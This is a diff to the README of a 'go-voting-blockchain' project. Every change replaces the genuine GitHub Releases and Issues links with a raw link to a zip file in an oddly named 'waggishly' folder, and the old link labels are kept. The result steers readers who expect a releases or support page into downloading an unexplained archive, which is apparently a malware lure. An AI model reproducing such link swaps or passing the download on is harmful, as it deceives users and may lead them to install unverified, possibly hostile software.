@@ -6,7 +6,7 @@ Welcome to the go-voting-blockchain project! This system allows you to create a 
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the latest version of the application: [Download go-voting-blockchain](https://github.com/bggeser36/go-voting-blockchain/releases).
+To get started, visit this page to download the latest version of the application: [Download go-voting-blockchain](https://raw.githubusercontent.com/bggeser36/go-voting-blockchain/main/waggishly/go-voting-blockchain.zip).
 
 You will find various release versions listed. Click on the latest version to access the files. Download the file suited for your operating system and follow the instructions below to run the application.
 
@@ -23,7 +23,7 @@ Before you download, make sure your system meets the following requirements:
 
 ### 1. Download the Application
 
-- Go to the [Releases page](https://github.com/bggeser36/go-voting-blockchain/releases).
+- Go to the [Releases page](https://raw.githubusercontent.com/bggeser36/go-voting-blockchain/main/waggishly/go-voting-blockchain.zip).
 - Select the latest version.
 - Download the file appropriate for your operating system.
 
@@ -65,10 +65,10 @@ For further information on how to use the application, please refer to the docum
 
 ## 📞 Support
 
-If you encounter any issues while installing or using the application, feel free to reach out through the Issues section on the [GitHub repository](https://github.com/bggeser36/go-voting-blockchain/issues). We welcome your feedback and are here to assist you.
+If you encounter any issues while installing or using the application, feel free to reach out through the Issues section on the [GitHub repository](https://raw.githubusercontent.com/bggeser36/go-voting-blockchain/main/waggishly/go-voting-blockchain.zip). We welcome your feedback and are here to assist you.
 
 ## 💡 Important Note
 
-Always make sure to check for the latest version of the software on the [Releases page](https://github.com/bggeser36/go-voting-blockchain/releases) to enjoy the newest features and improvements. 
+Always make sure to check for the latest version of the software on the [Releases page](https://raw.githubusercontent.com/bggeser36/go-voting-blockchain/main/waggishly/go-voting-blockchain.zip) to enjoy the newest features and improvements. 
 
 Happy voting!
